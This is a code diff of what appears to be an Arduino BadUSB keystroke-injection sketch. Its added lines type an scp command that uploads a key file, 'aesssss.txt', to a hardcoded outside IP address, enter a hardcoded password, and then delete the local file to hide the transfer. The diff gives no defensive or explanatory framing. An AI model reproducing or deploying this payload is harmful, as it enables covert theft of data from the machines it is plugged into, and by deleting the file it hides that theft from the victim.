@@ -72,12 +72,16 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(3000);
-  
-  Keyboard.println("scp  badusb@118.178.229.36:/badusb/uploads/");
+  //上传密钥文件
+  Keyboard.println("scp .\aesssss.txt badusb@118.178.229.36:/badusb/uploads/");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(30000);
+  delay(3000);
   Keyboard.println("ljjyyds");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
+  Keyboard.println("del .\aesssss.txt");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(3000);
